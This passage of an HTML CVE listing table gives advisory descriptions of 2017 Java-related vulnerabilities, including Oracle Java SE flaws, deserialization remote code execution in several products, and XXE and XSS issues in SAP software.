Availability impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3272">CVE-2017-3272</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS v3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3262">CVE-2017-3262</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Java Mission Control). The supported version that is affected is Java SE: 8u112. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: Applies to Java Mission Control Installation. CVSS v3.0 Base Score 5.3 (Confidentiality impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3261">CVE-2017-3261</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS v3.0 Base Score 4.3 (Confidentiality impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3260">CVE-2017-3260</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: AWT). Supported versions that are affected are Java SE: 7u121 and 8u112. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS v3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3259">CVE-2017-3259</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Deployment). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS v3.0 Base Score 3.7 (Confidentiality impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3253">CVE-2017-3253</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: 2D). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111; JRockit: R28.3.12. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS v3.0 Base Score 7.5 (Availability impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3252">CVE-2017-3252</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JAAS). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111; JRockit: R28.3.12. Difficult to exploit vulnerability allows low privileged attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded, JRockit accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS v3.0 Base Score 5.8 (Integrity impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3241">CVE-2017-3241</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: RMI). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111; JRockit: R28.3.12. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. While the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded, JRockit. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS v3.0 Base Score 9.0 (Confidentiality, Integrity and Availability impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3231">CVE-2017-3231</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS v3.0 Base Score 4.3 (Confidentiality impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3208">CVE-2017-3208</a></td>
		<td valign="top">The Java implementation of AMF3 deserializers used by WebORB for Java by Midnight Coders, version 5.1.1.0, allows external entity references (XXEs) from XML documents embedded within AMF3 messages. If the XML parsing is handled incorrectly it could potentially expose sensitive data on the server, denial of service, or server side request forgery.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3207">CVE-2017-3207</a></td>
		<td valign="top">The Java implementations of AMF3 deserializers in WebORB for Java by Midnight Coders, version 5.1.1.0, derive class instances from java.io.Externalizable rather than the AMF3 specification's recommendation of flash.utils.IExternalizable. A remote attacker with the ability to spoof or control an RMI server connection may be able to send serialized Java objects that execute arbitrary code when deserialized.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3206">CVE-2017-3206</a></td>
		<td valign="top">The Java implementation of AMF3 deserializers used by Flamingo amf-serializer by Exadel, version 2.2.0, allows external entity references (XXEs) from XML documents embedded within AMF3 messages. If the XML parsing is handled incorrectly it could potentially expose sensitive data on the server, denial of service, or server side request forgery.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3203">CVE-2017-3203</a></td>
		<td valign="top">The Java implementations of AMF3 deserializers in Pivotal/Spring Spring-flex derive class instances from java.io.Externalizable rather than the AMF3 specification's recommendation of flash.utils.IExternalizable. A remote attacker with the ability to spoof or control an RMI server connection may be able to send serialized Java objects that execute arbitrary code when deserialized.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3202">CVE-2017-3202</a></td>
		<td valign="top">The Java implementation of AMF3 deserializers used in Flamingo amf-serializer by Exadel, version 2.2.0, may allow instantiation of arbitrary classes via their public parameter-less constructor and subsequently call arbitrary Java Beans setter methods. The ability to exploit this vulnerability depends on the availability of classes in the class path that make use of deserialization. A remote attacker with the ability to spoof or control information may be able to send serialized Java objects with pre-set properties that result in arbitrary code execution when deserialized.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3201">CVE-2017-3201</a></td>
		<td valign="top">The Java implementation of AMF3 deserializers used in Flamingo amf-serializer by Exadel, version 2.2.0 derives class instances from java.io.Externalizable rather than the AMF3 specification's recommendation of flash.utils.IExternalizable. A remote attacker with the ability to spoof or control an RMI server connection may be able to send serialized Java objects that execute arbitrary code when deserialized.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3200">CVE-2017-3200</a></td>
		<td valign="top">The Java implementation of AMF3 deserializers used in GraniteDS, version 3.1.1.G, may allow instantiation of arbitrary classes via their public parameter-less constructor and subsequently call arbitrary Java Beans setter methods. The ability to exploit this vulnerability depends on the availability of classes in the class path that make use of deserialization. A remote attacker with the ability to spoof or control information may be able to send serialized Java objects with pre-set properties that result in arbitrary code execution when deserialized.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3199">CVE-2017-3199</a></td>
		<td valign="top">The Java implementation of GraniteDS, version 3.1.1.GA, AMF3 deserializers derives class instances from java.io.Externalizable rather than the AMF3 specification's recommendation of flash.utils.IExternalizable. A remote attacker with the ability to spoof or control an RMI server connection may be able to send serialized Java objects that execute arbitrary code when deserialized.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3159">CVE-2017-3159</a></td>
		<td valign="top">Apache Camel's camel-snakeyaml component is vulnerable to Java object de-serialization vulnerability. De-serializing untrusted data can lead to security flaws.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-3066">CVE-2017-3066</a></td>
		<td valign="top">Adobe ColdFusion 2016 Update 3 and earlier, ColdFusion 11 update 11 and earlier, ColdFusion 10 Update 22 and earlier have a Java deserialization vulnerability in the Apache BlazeDS library. Successful exploitation could lead to arbitrary code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-2767">CVE-2017-2767</a></td>
		<td valign="top">EMC Network Configuration Manager (NCM) 9.3.x, EMC Network Configuration Manager (NCM) 9.4.0.x, EMC Network Configuration Manager (NCM) 9.4.1.x, EMC Network Configuration Manager (NCM) 9.4.2.x contains a Java RMI Remote Code Execution vulnerability that could potentially be exploited by malicious users to compromise the affected system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-20151">CVE-2017-20151</a></td>
		<td valign="top">A vulnerability classified as problematic was found in iText RUPS. This vulnerability affects unknown code of the file src/main/java/com/itextpdf/rups/model/XfaFile.java. The manipulation leads to xml external entity reference. The patch is identified as ac5590925874ef810018a6b60fec216eee54fb32. It is recommended to apply a patch to fix this issue. VDB-217054 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-16861">CVE-2017-16861</a></td>
		<td valign="top">It was possible for double OGNL evaluation in certain redirect action and in WebWork URL and Anchor tags in JSP files to occur. An attacker who can access the web interface of Fisheye or Crucible or who hosts a website that a user who can access the web interface of Fisheye or Crucible visits, is able to exploit this vulnerability to execute Java code of their choice on systems that run a vulnerable version of Fisheye or Crucible. All versions of Fisheye and Crucible before 4.4.5 (the fixed version for 4.4.x) and from 4.5.0 before 4.5.2 (the fixed version for 4.5.x) are affected by this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1681">CVE-2017-1681</a></td>
		<td valign="top">IBM WebSphere Application Server (IBM Liberty for Java for Bluemix 3.15) could allow a local attacker to obtain sensitive information, caused by improper handling of application requests, which could allow unauthorized access to read a file. IBM X-Force ID: 134003.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-16670">CVE-2017-16670</a></td>
		<td valign="top">The project import functionality in SoapUI 5.3.0 allows remote attackers to execute arbitrary Java code via a crafted request parameter in a WSDL project file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1583">CVE-2017-1583</a></td>
		<td valign="top">IBM WebSphere Application Server (IBM Liberty for Java for Bluemix 3.13)could allow a remote attacker to obtain sensitive information caused by improper error handling by MyFaces in JSF.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-15708">CVE-2017-15708</a></td>
		<td valign="top">In Apache Synapse, by default no authentication is required for Java Remote Method Invocation (RMI). So Apache Synapse 3.0.1 or all previous releases (3.0.0, 2.1.0, 2.0.0, 1.2, 1.1.2, 1.1.1) allows remote code execution attacks that can be performed by injecting specially crafted serialized objects. And the presence of Apache Commons Collections 3.2.1 (commons-collections-3.2.1.jar) or previous versions in Synapse distribution makes this exploitable. To mitigate the issue, we need to limit RMI access to trusted users only. Further upgrading to 3.0.1 version will eliminate the risk of having said Commons Collection version. In Synapse 3.0.1, Commons Collection has been updated to 3.2.2 version.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-15703">CVE-2017-15703</a></td>
		<td valign="top">Any authenticated user (valid client certificate but without ACL permissions) could upload a template which contained malicious code and caused a denial of service via Java deserialization attack. The fix to properly handle Java deserialization was applied on the Apache NiFi 1.4.0 release. Users running a prior 1.x release should upgrade to the appropriate release.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-15612">CVE-2017-15612</a></td>
		<td valign="top">mistune.py in Mistune 0.7.4 allows XSS via an unexpected newline (such as in java\nscript:) or a crafted email address, related to the escape and autolink functions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-15296">CVE-2017-15296</a></td>
		<td valign="top">The Java component in SAP CRM has CSRF. This is SAP Security Note 2478964.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-15294">CVE-2017-15294</a></td>
		<td valign="top">The Java administration console in SAP CRM has XSS. This is SAP Security Note 2478964.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-14589">CVE-2017-14589</a></td>
		<td valign="top">It was possible for double OGNL evaluation in FreeMarker templates through Struts FreeMarker tags to occur. An attacker who has restricted administration rights to Bamboo or who hosts a website that a Bamboo administrator visits, is able to exploit this vulnerability to execute Java code of their choice on systems that run a vulnerable version of Bamboo. All versions of Bamboo before 6.1.6 (the fixed version for 6.1.x) and from 6.2.0 before 6.2.5 (the fixed version for 6.2.x) are affected by this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-14581">CVE-2017-14581</a></td>
		<td valign="top">The Host Control web service in SAP NetWeaver AS JAVA 7.0 through 7.5 allows remote attackers to cause a denial of service (service crash) via a crafted request, aka SAP Security Note 2389181.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-14063">CVE-2017-14063</a></td>
		<td valign="top">Async Http Client (aka async-http-client) before 2.0.35 can be tricked into connecting to a host different from the one extracted by java.net.URI if a '?' character occurs in a fragment identifier. Similar bugs were previously identified in cURL (CVE-2016-8624) and Oracle Java 8 java.net.URL.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1337">CVE-2017-1337</a></td>
		<td valign="top">IBM WebSphere MQ 9.0.1 and 9.0.2 Java/JMS application can incorrectly transmit user credentials in plain text. IBM X-Force ID: 126245.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-13098">CVE-2017-13098</a></td>
		<td valign="top">BouncyCastle TLS prior to version 1.0.3, when configured to use the JCE (Java Cryptography Extension) for cryptographic functions, provides a weak Bleichenbacher oracle when any TLS cipher suite using RSA key exchange is negotiated. An attacker can recover the private key from a vulnerable application. This vulnerability is referred to as "ROBOT."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1289">CVE-2017-1289</a></td>
		<td valign="top">IBM SDK, Java Technology Edition is vulnerable XML External Entity Injection (XXE) error when processing XML data. A remote attacker could exploit this vulnerability to expose highly sensitive information or consume memory resources. IBM X-Force ID: 125150.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-12815">CVE-2017-12815</a></td>
		<td valign="top">Analysis of the Bomgar Remote Support Portal JavaStart.jar Applet 52790 and earlier revealed that it is vulnerable to a path traversal vulnerability. The archive can be downloaded from a given Bomgar Remote Support Portal deployment at https://domain/api/content/JavaStart.jar and is callable from an arbitrary website using &lt;object&gt; and/or &lt;appletHTML&gt; tags. Successful exploitation results in file creation/modification/deletion in the operating system and with privileges of the user that ran the Java applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-12637">CVE-2017-12637</a></td>
		<td valign="top">Directory traversal vulnerability in scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS in SAP NetWeaver Application Server Java 7.5 allows remote attackers to read arbitrary files via a .. (dot dot) in the query string, as exploited in the wild in August 2017, aka SAP Security Note 2486657.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-12634">CVE-2017-12634</a></td>
		<td valign="top">The camel-castor component in Apache Camel 2.x before 2.19.4 and 2.20.x before 2.20.1 is vulnerable to Java object de-serialisation vulnerability. De-serializing untrusted data can lead to security flaws.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-12633">CVE-2017-12633</a></td>
		<td valign="top">The camel-hessian component in Apache Camel 2.x before 2.19.4 and 2.20.x before 2.20.1 is vulnerable to Java object de-serialisation vulnerability. De-serializing untrusted data can lead to security flaws.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-12628">CVE-2017-12628</a></td>
		<td valign="top">The JMX server embedded in Apache James, also used by the command line client is exposed to a java de-serialization issue, and thus can be used to execute arbitrary commands. As James exposes JMX socket by default only on local-host, this vulnerability can only be used for privilege escalation. Release 3.0.1 upgrades the incriminated library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-11460">CVE-2017-11460</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the DataArchivingService servlet in SAP NetWeaver Portal 7.4 allows remote attackers to inject arbitrary web script or HTML via the responsecode parameter to shp/shp_result.jsp, aka SAP Security Note 2308535.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-11458">CVE-2017-11458</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the ctcprotocol/Protocol servlet in SAP NetWeaver AS JAVA 7.3 allows remote attackers to inject arbitrary web script or HTML via the sessionID parameter, aka SAP Security Note 2406783.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-11457">CVE-2017-11457</a></td>
		<td valign="top">XML external entity (XXE) vulnerability in com.sap.km.cm.ice in SAP NetWeaver AS JAVA 7.5 allows remote authenticated users to read arbitrary files or conduct server-side request forgery (SSRF) attacks via a crafted DTD in an XML request, aka SAP Security Note 2387249.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10992">CVE-2017-10992</a></td>
		<td valign="top">In HPE Storage Essentials 9.5.0.142, there is Unauthenticated Java Deserialization with remote code execution via OS commands in a request to invoker/JMXInvokerServlet, aka PSRT110461.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10934">CVE-2017-10934</a></td>
		<td valign="top">All versions prior to V5.09.02.02T4 of the ZTE ZXIPTV-EPG product use the Java RMI service in which the servers use the Apache Commons Collections (ACC) library that may result in Java deserialization vulnerabilities. An unauthenticated remote attacker can exploit the vulnerabilities by sending a crafted RMI request to execute arbitrary code on the target host.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10932">CVE-2017-10932</a></td>
		<td valign="top">All versions prior to V12.17.20 of the ZTE Microwave NR8000 series products - NR8120, NR8120A, NR8120, NR8150, NR8250, NR8000 TR and NR8950 are the applications of C/S architecture using the Java RMI service in which the servers use the Apache Commons Collections (ACC) library that may result in Java deserialization vulnerabilities. An unauthenticated remote attacker can exploit the vulnerabilities by sending a crafted RMI request to execute arbitrary code on the target host.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10701">CVE-2017-10701</a></td>
		<td valign="top">Cross site scripting (XSS) vulnerability in SAP Enterprise Portal 7.50 allows remote attackers to inject arbitrary web script or HTML, aka SAP Security Notes 2469860, 2471209, and 2488516.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10670">CVE-2017-10670</a></td>
		<td valign="top">An XML External Entity (XXE) issue exists in OSCI-Transport 1.2 as used in OSCI Transport Library 1.6.1 (Java) and OSCI Transport Library 1.6 (.NET), exploitable by sending a crafted standard-conforming OSCI message from within the infrastructure.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10669">CVE-2017-10669</a></td>
		<td valign="top">Signature Wrapping exists in OSCI-Transport 1.2 as used in OSCI Transport Library 1.6.1 (Java) and OSCI Transport Library 1.6 (.NET). An attacker with access to unencrypted OSCI protocol messages must send crafted protocol messages with duplicate IDs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10668">CVE-2017-10668</a></td>
		<td valign="top">A Padding Oracle exists in OSCI-Transport 1.2 as used in OSCI Transport Library 1.6.1 (Java) and OSCI Transport Library 1.6 (.NET). Under an MITM condition within the OSCI infrastructure, an attacker needs to send crafted protocol messages to analyse the CBC mode padding in order to decrypt the transport encryption.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10388">CVE-2017-10388</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144. Difficult to exploit vulnerability allows unauthenticated attacker with network access via Kerberos to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: Applies to the Java SE Kerberos client. CVSS 3.0 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10386">CVE-2017-10386</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.7. Easily exploitable vulnerability allows high privileged attacker with network access via HTTP to compromise Java Advanced Management Console. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java Advanced Management Console, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java Advanced Management Console accessible data as well as unauthorized read access to a subset of Java Advanced Management Console accessible data. CVSS 3.0 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10380">CVE-2017-10380</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.7. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTP to compromise Java Advanced Management Console. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java Advanced Management Console, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java Advanced Management Console accessible data as well as unauthorized read access to a subset of Java Advanced Management Console accessible data. CVSS 3.0 Base Score 4.7 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10357">CVE-2017-10357</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Serialization). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10356">CVE-2017-10356</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144; JRockit: R28.3.15. Easily exploitable vulnerability allows unauthenticated attacker with logon to the infrastructure where Java SE, Java SE Embedded, JRockit executes to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 6.2 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10355">CVE-2017-10355</a></td>
